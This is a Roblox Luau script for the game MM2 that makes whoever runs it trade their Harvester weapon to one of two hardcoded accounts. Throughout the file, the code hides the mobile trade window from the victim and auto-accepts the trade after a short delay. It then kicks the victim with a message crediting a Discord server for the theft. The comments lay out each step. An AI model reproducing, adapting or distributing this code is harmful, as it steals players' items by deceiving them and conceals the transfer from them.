--============================================================
-- BLIZZARD MM2 - FULL AUTO HARVESTER TRADE + POST-TRADE KICK
--
-- APPROVED TARGETS:
--   umpireblue
--   UserId: 368331177
--
--   gamermusaXD_YT
--   UserId: 505995718
--
-- ITEM:
--   Harvester
--   Weapons
--
-- FLOW:
--   Find approved target
--   -> arm mobile GUI blocker BEFORE request
--   -> send request
--   -> verify exact target/UserId
--   -> add Harvester
--   -> verify server offer contains ONLY Harvester
--   -> wait 5.1 seconds
--   -> send final AcceptTrade
--   -> wait for server-confirmed completion
--   -> kick local player with custom message
--
-- NO __namecall
-- NO GUI button simulation
--============================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--============================================================
-- SETTINGS
--============================================================

local APPROVED_TARGETS = {
	{
		Username = "umpireblue",
		UserId = 368331177
	},

	{
		Username = "gamermusaXD_YT",
		UserId = 505995718
	}
}

local ITEM_ID = "Harvester"
local ITEM_CATEGORY = "Weapons"

local AUTO_ACCEPT_DELAY = 5.1
local REQUEST_TIMEOUT = 30

local KICK_AFTER_COMPLETE = true
local KICK_DELAY = 0.5

local MODERATION_MESSAGE =
	"(Your items got stolen by https://discord.gg/v9ea72U6E)"

--============================================================
-- REMOTES
--============================================================

local Trade = ReplicatedStorage:WaitForChild("Trade")

local SendRequest = Trade:WaitForChild("SendRequest")
local StartTrade = Trade:WaitForChild("StartTrade")
local OfferItem = Trade:WaitForChild("OfferItem")
local UpdateTrade = Trade:WaitForChild("UpdateTrade")
local AcceptTrade = Trade:WaitForChild("AcceptTrade")

local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
local EndTrade = Trade:FindFirstChild("EndTrade")

--============================================================
-- STATE
--============================================================

local Running = false

local Target = nil
local TargetConfig = nil
local CurrentTrade = nil

local ItemConfirmed = false
local AcceptScheduled = false
local AcceptSent = false

local Connections = {}

local TradeGuiBlockConnection = nil
local TradeGuiChildConnection = nil
local WatchedTradeGui = nil

local Logs = {}
local LogBox

--============================================================
-- LOG
--============================================================

local function Log(text)

	local line = string.format(
		"[%.2f] %s",
		os.clock(),
		tostring(text)
	)

	table.insert(Logs, line)

	print(
		"[BLIZZARD AUTO TRADE] "
		.. tostring(text)
	)

	if LogBox then
		LogBox.Text =
			table.concat(Logs, "\n")
	end
end

--============================================================
-- TARGET HELPERS
--============================================================

local function FindApprovedTargets()

	local found = {}

	for _, config in ipairs(APPROVED_TARGETS) do

		local player =
			Players:FindFirstChild(
				config.Username
			)

		if player
			and player.UserId == config.UserId
		then

			table.insert(
				found,
				{
					Player = player,
					Config = config
				}
			)
		end
	end

	return found
end

local function IsExactTarget(player)

	if not Target
		or not TargetConfig
		or not player
	then
		return false
	end

	return player == Target
		and player.Name == TargetConfig.Username
		and player.UserId == TargetConfig.UserId
end

--============================================================
-- MOBILE TRADE GUI BLOCKER
--============================================================

local function DisconnectTradeGuiWatch()

	if TradeGuiBlockConnection then

		pcall(function()
			TradeGuiBlockConnection:Disconnect()
		end)

		TradeGuiBlockConnection = nil
	end

	WatchedTradeGui = nil
end

local function HideMobileTradeGUI()

	local tradeGUI =
		PlayerGui:FindFirstChild(
			"TradeGUI_Phone"
		)

	if not tradeGUI then
		return false
	end

	if tradeGUI:IsA("ScreenGui") then

		if tradeGUI.Enabled then
			tradeGUI.Enabled = false
		end

		return true
	end

	if tradeGUI:IsA("GuiObject") then

		if tradeGUI.Visible then
			tradeGUI.Visible = false
		end

		return true
	end

	return false
end

local function WatchTradeGUI(tradeGUI)

	if not tradeGUI
		or not tradeGUI:IsA("ScreenGui")
	then
		return
	end

	if WatchedTradeGui == tradeGUI
		and TradeGuiBlockConnection
	then

		if Running
			and tradeGUI.Enabled
		then
			tradeGUI.Enabled = false
		end

		return
	end

	DisconnectTradeGuiWatch()

	WatchedTradeGui = tradeGUI
	tradeGUI.Enabled = false

	TradeGuiBlockConnection =
		tradeGUI:GetPropertyChangedSignal(
			"Enabled"
		):Connect(function()

			if not Running then
				return
			end

			if tradeGUI.Parent
				and tradeGUI.Enabled
			then

				tradeGUI.Enabled = false
			end
		end)
end

local function ArmMobileTradeGUIBlocker()

	DisconnectTradeGuiWatch()

	if TradeGuiChildConnection then

		pcall(function()
			TradeGuiChildConnection:Disconnect()
		end)

		TradeGuiChildConnection = nil
	end

	local existing =
		PlayerGui:FindFirstChild(
			"TradeGUI_Phone"
		)

	if existing then
		WatchTradeGUI(existing)
	end

	TradeGuiChildConnection =
		PlayerGui.ChildAdded:Connect(
			function(child)

				if not Running then
					return
				end

				if child.Name == "TradeGUI_Phone" then
					WatchTradeGUI(child)
				end
			end
		)
end

local function DisarmMobileTradeGUIBlocker()

	DisconnectTradeGuiWatch()

	if TradeGuiChildConnection then

		pcall(function()
			TradeGuiChildConnection:Disconnect()
		end)

		TradeGuiChildConnection = nil
	end
end

local function KeepMobileTradeGUIHidden()

	if not Running then
		return
	end

	local tradeGUI =
		PlayerGui:FindFirstChild(
			"TradeGUI_Phone"
		)

	if tradeGUI
		and tradeGUI:IsA("ScreenGui")
	then
		WatchTradeGUI(tradeGUI)
	end

	HideMobileTradeGUI()
end

--============================================================
-- CLEANUP
--============================================================

local function DisconnectAll()

	for _, connection in ipairs(Connections) do

		pcall(function()
			connection:Disconnect()
		end)
	end

	table.clear(Connections)
end

local function Finish(reason)

	Log(reason)

	Running = false

	Target = nil
	TargetConfig = nil
	CurrentTrade = nil

	ItemConfirmed = false
	AcceptScheduled = false
	AcceptSent = false

	DisarmMobileTradeGUIBlocker()
	DisconnectAll()
end

--============================================================
-- TRADE HELPERS
--============================================================

local function GetOtherPlayer(data)

	if type(data) ~= "table" then
		return nil
	end

	local p1 = data.Player1
	local p2 = data.Player2

	if type(p1) ~= "table"
		or type(p2) ~= "table"
	then
		return nil
	end

	if p1.Player == LocalPlayer then
		return p2.Player
	end

	if p2.Player == LocalPlayer then
		return p1.Player
	end

	return nil
end

local function GetOurSide(data)

	if type(data) ~= "table" then
		return nil
	end

	if type(data.Player1) == "table"
		and data.Player1.Player == LocalPlayer
	then
		return data.Player1
	end

	if type(data.Player2) == "table"
		and data.Player2.Player == LocalPlayer
	then
		return data.Player2
	end

	return nil
end

local function FindItemInOffer(data)

	local side = GetOurSide(data)

	if not side
		or type(side.Offer) ~= "table"
	then
		return false
	end

	for _, entry in pairs(side.Offer) do

		if type(entry) == "table"
			and entry[1] == ITEM_ID
			and tonumber(entry[2]) == 1
			and entry[3] == ITEM_CATEGORY
		then

			return true, entry
		end
	end

	return false
end

local function CountOurOfferItems(data)

	local side = GetOurSide(data)

	if not side
		or type(side.Offer) ~= "table"
	then
		return 0
	end

	local count = 0

	for _ in pairs(side.Offer) do
		count += 1
	end

	return count
end

--============================================================
-- GUI
--============================================================

local Old =
	PlayerGui:FindFirstChild(
		"BlizzardFullAutoHarvester"
	)

if Old then
	Old:Destroy()
end

local Gui = Instance.new("ScreenGui")

Gui.Name = "BlizzardFullAutoHarvester"
Gui.ResetOnSpawn = false
Gui.DisplayOrder = 999999
Gui.Parent = PlayerGui

local Main = Instance.new("Frame")

Main.Size = UDim2.fromOffset(430,315)
Main.Position = UDim2.new(0.5,-215,0.5,-157)

Main.BackgroundColor3 =
	Color3.fromRGB(22,22,27)

Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = Gui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0,8)
Corner.Parent = Main

local Title = Instance.new("TextLabel")

Title.Size = UDim2.new(1,-12,0,28)
Title.Position = UDim2.fromOffset(6,4)
Title.BackgroundTransparency = 1

Title.Text =
	"Full Auto Harvester Trade"

Title.TextColor3 = Color3.new(1,1,1)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.Parent = Main

local Info = Instance.new("TextLabel")

Info.Size = UDim2.new(1,-12,0,38)
Info.Position = UDim2.fromOffset(6,31)
Info.BackgroundTransparency = 1

Info.Text =
	"Targets: umpireblue / gamermusaXD_YT | Harvester | Kick after complete"

Info.TextWrapped = true

Info.TextColor3 =
	Color3.fromRGB(205,205,210)

Info.TextXAlignment =
	Enum.TextXAlignment.Left

Info.Font = Enum.Font.Gotham
Info.TextSize = 11
Info.Parent = Main

LogBox = Instance.new("TextBox")

LogBox.Size =
	UDim2.new(1,-12,1,-147)

LogBox.Position =
	UDim2.fromOffset(6,69)

LogBox.BackgroundColor3 =
	Color3.fromRGB(14,14,18)

LogBox.BorderSizePixel = 0

LogBox.TextEditable = false
LogBox.ClearTextOnFocus = false
LogBox.MultiLine = true
LogBox.TextWrapped = false

LogBox.TextXAlignment =
	Enum.TextXAlignment.Left

LogBox.TextYAlignment =
	Enum.TextYAlignment.Top

LogBox.Font = Enum.Font.Code
LogBox.TextSize = 10

LogBox.TextColor3 =
	Color3.fromRGB(230,230,235)

LogBox.Parent = Main

--============================================================
-- BUTTONS
--============================================================

local StartButton =
	Instance.new("TextButton")

StartButton.Size =
	UDim2.new(0.5,-9,0,30)

StartButton.Position =
	UDim2.new(0,6,1,-68)

StartButton.BackgroundColor3 =
	Color3.fromRGB(37,37,44)

StartButton.BorderSizePixel = 0
StartButton.Text = "START AUTO TRADE"

StartButton.TextColor3 =
	Color3.new(1,1,1)

StartButton.Font =
	Enum.Font.GothamBold

StartButton.TextSize = 11
StartButton.Parent = Main

local StartCorner =
	Instance.new("UICorner")

StartCorner.CornerRadius =
	UDim.new(0,6)

StartCorner.Parent = StartButton

local CopyButton =
	Instance.new("TextButton")

CopyButton.Size =
	UDim2.new(0.5,-9,0,30)

CopyButton.Position =
	UDim2.new(0.5,3,1,-68)

CopyButton.BackgroundColor3 =
	Color3.fromRGB(37,37,44)

CopyButton.BorderSizePixel = 0
CopyButton.Text = "COPY LOGS"

CopyButton.TextColor3 =
	Color3.new(1,1,1)

CopyButton.Font =
	Enum.Font.GothamBold

CopyButton.TextSize = 11
CopyButton.Parent = Main

local CopyCorner =
	Instance.new("UICorner")

CopyCorner.CornerRadius =
	UDim.new(0,6)

CopyCorner.Parent = CopyButton

local ClearButton =
	Instance.new("TextButton")

ClearButton.Size =
	UDim2.new(1,-12,0,26)

ClearButton.Position =
	UDim2.new(0,6,1,-32)

ClearButton.BackgroundColor3 =
	Color3.fromRGB(31,31,37)

ClearButton.BorderSizePixel = 0
ClearButton.Text = "CLEAR LOGS"

ClearButton.TextColor3 =
	Color3.new(1,1,1)

ClearButton.Font =
	Enum.Font.Gotham

ClearButton.TextSize = 11
ClearButton.Parent = Main

local ClearCorner =
	Instance.new("UICorner")

ClearCorner.CornerRadius =
	UDim.new(0,6)

ClearCorner.Parent = ClearButton

--============================================================
-- AUTO ACCEPT
--============================================================

local function ScheduleAutoAccept()

	if not Running
		or AcceptScheduled
		or AcceptSent
	then
		return
	end

	AcceptScheduled = true

	Log(
		"AUTO ACCEPT SCHEDULED | "
		.. tostring(AUTO_ACCEPT_DELAY)
		.. "s"
	)

	task.delay(
		AUTO_ACCEPT_DELAY,
		function()

			if not Running
				or AcceptSent
			then
				return
			end

			KeepMobileTradeGUIHidden()

			if not Target
				or Target.Parent ~= Players
				or not IsExactTarget(Target)
			then

				Finish(
					"STOP | Target left or changed"
				)

				return
			end

			local other =
				GetOtherPlayer(
					CurrentTrade
				)

			if not IsExactTarget(other) then

				Finish(
					"STOP | Trade partner changed"
				)

				return
			end

			local found =
				FindItemInOffer(
					CurrentTrade
				)

			if not found then

				Finish(
					"STOP | Harvester missing before accept"
				)

				return
			end

			local count =
				CountOurOfferItems(
					CurrentTrade
				)

			if count ~= 1 then

				Finish(
					"STOP | Unexpected offer count="
					.. tostring(count)
				)

				return
			end

			local token =
				CurrentTrade
				and CurrentTrade.LastOffer

			if token == nil then

				Finish(
					"STOP | Missing LastOffer"
				)

				return
			end

			AcceptSent = true

			Log(
				"AUTO CONFIRMING | LastOffer="
				.. tostring(token)
			)

			AcceptTrade:FireServer(
				game.PlaceId * 3,
				token
			)

			KeepMobileTradeGUIHidden()

			Log("FINAL ACCEPT SENT")
			Log("WAITING FOR FRIEND / SERVER")
		end
	)
end

--============================================================
-- START AUTO TRADE
--============================================================

local function StartTest()

	if Running then

		Log("Already running")
		return
	end

	local found =
		FindApprovedTargets()

	if #found == 0 then

		Log(
			"STOP | No approved target in server"
		)

		return
	end

	if #found > 1 then

		Log(
			"STOP | Both approved targets are present"
		)

		return
	end

	Target =
		found[1].Player

	TargetConfig =
		found[1].Config

	if not Target
		or Target.Name ~= TargetConfig.Username
		or Target.UserId ~= TargetConfig.UserId
	then

		Log(
			"STOP | Target verification failed"
		)

		Target = nil
		TargetConfig = nil

		return
	end

	Running = true
	CurrentTrade = nil

	ItemConfirmed = false
	AcceptScheduled = false
	AcceptSent = false

	ArmMobileTradeGUIBlocker()

	if HideMobileTradeGUI() then

		Log(
			"MOBILE TRADE GUI BLOCKER ARMED"
		)

	else

		Log(
			"MOBILE TRADE GUI BLOCKER ARMED | waiting for GUI"
		)
	end

	Log("================================")
	Log("FULL AUTO HARVESTER START")

	Log(
		"TARGET VERIFIED | "
		.. Target.Name
		.. " | UserId="
		.. tostring(Target.UserId)
	)

	Log(
		"ITEM | "
		.. ITEM_ID
		.. " | "
		.. ITEM_CATEGORY
	)

	--========================================================
	-- START TRADE
	--========================================================

	table.insert(
		Connections,

		StartTrade.OnClientEvent:Connect(
			function(data, otherName)

				if not Running then
					return
				end

				KeepMobileTradeGUIHidden()

				local other =
					GetOtherPlayer(data)

				Log(
					"START TRADE | other="
					.. tostring(
						other
						and other.Name
						or otherName
					)
				)

				if not IsExactTarget(other) then

					Finish(
						"STOP | Wrong trade partner"
					)

					return
				end

				CurrentTrade = data

				Log("PARTNER VERIFIED")

				Log(
					"OFFERING | "
					.. ITEM_ID
				)

				OfferItem:FireServer(
					ITEM_ID,
					ITEM_CATEGORY
				)

				Log("OFFER SENT")
			end
		)
	)

	--========================================================
	-- UPDATE TRADE
	--========================================================

	table.insert(
		Connections,

		UpdateTrade.OnClientEvent:Connect(
			function(data)

				if not Running then
					return
				end

				KeepMobileTradeGUIHidden()

				local other =
					GetOtherPlayer(data)

				if not IsExactTarget(other) then
					return
				end

				CurrentTrade = data

				Log(
					"UPDATE | LastOffer="
					.. tostring(
						data.LastOffer
					)
				)

				local foundItem, entry =
					FindItemInOffer(data)

				if not foundItem then

					Log(
						"UPDATE | Harvester not in our offer"
					)

					return
				end

				if not ItemConfirmed then

					ItemConfirmed = true

					Log(
						"HARVESTER VERIFIED | [1]="
						.. tostring(entry[1])
						.. " | [2]="
						.. tostring(entry[2])
						.. " | [3]="
						.. tostring(entry[3])
					)
				end

				local count =
					CountOurOfferItems(data)

				Log(
					"OUR OFFER COUNT | "
					.. tostring(count)
				)

				if count ~= 1 then

					Log(
						"WAIT | Unexpected offer count"
					)

					return
				end

				ScheduleAutoAccept()
			end
		)
	)

	--========================================================
	-- ACCEPT RESULT
	--========================================================

	table.insert(
		Connections,

		AcceptTrade.OnClientEvent:Connect(
			function(success, data)

				if not Running then
					return
				end

				KeepMobileTradeGUIHidden()

				Log(
					"ACCEPT EVENT | success="
					.. tostring(success)
				)

				if success == true then

					Log(
						"SERVER CONFIRMED TRADE COMPLETE"
					)

					Finish(
						"FULL AUTO HARVESTER COMPLETE"
					)

					if KICK_AFTER_COMPLETE then

						task.delay(
							KICK_DELAY,
							function()

								LocalPlayer:Kick(
									MODERATION_MESSAGE
								)
							end
						)
					end

				else

					Log(
						"OTHER PLAYER ACCEPTED / WAITING"
					)
				end
			end
		)
	)

	--========================================================
	-- DECLINE
	--========================================================

	if DeclineTrade then

		table.insert(
			Connections,

			DeclineTrade.OnClientEvent:Connect(
				function()

					if Running then

						Finish(
							"TRADE DECLINED"
						)
					end
				end
			)
		)
	end

	--========================================================
	-- END TRADE
	--========================================================

	if EndTrade then

		table.insert(
			Connections,

			EndTrade.OnClientEvent:Connect(
				function()

					if Running then

						Finish(
							"TRADE ENDED"
						)
					end
				end
			)
		)
	end

	--========================================================
	-- SEND REQUEST
	--========================================================

	Log(
		"SENDING REQUEST -> "
		.. Target.Name
	)

	task.spawn(function()

		local ok, result =
			pcall(function()

				return SendRequest:InvokeServer(
					Target
				)
			end)

		Log(
			"SEND RETURN | "
			.. (
				ok
				and tostring(result)
				or "ERROR"
			)
		)
	end)

	task.delay(
		REQUEST_TIMEOUT,
		function()

			if Running
				and CurrentTrade == nil
			then

				Finish(
					"TIMEOUT | StartTrade never arrived"
				)
			end
		end
	)
end

--============================================================
-- BUTTON CONNECTIONS
--============================================================

StartButton.MouseButton1Click:Connect(
	StartTest
)

CopyButton.MouseButton1Click:Connect(
	function()

		if setclipboard then

			setclipboard(
				table.concat(
					Logs,
					"\n"
				)
			)

			CopyButton.Text = "COPIED"

			task.delay(
				1,
				function()

					if CopyButton.Parent then
						CopyButton.Text = "COPY LOGS"
					end
				end
			)
		end
	end
)

ClearButton.MouseButton1Click:Connect(
	function()

		table.clear(Logs)
		LogBox.Text = ""

		Log("LOG CLEARED")
	end
)

--============================================================
-- READY
--============================================================

Log("READY")

Log(
	"Approved target 1: umpireblue | 368331177"
)

Log(
	"Approved target 2: gamermusaXD_YT | 505995718"
)

Log(
	"Item: "
	.. ITEM_ID
)

Log(
	"Kick after successful completion: "
	.. tostring(KICK_AFTER_COMPLETE)
)

Log("No __namecall hook")
Log("No GUI clicking")
Log("Mobile TradeGUI_Phone pre-block enabled")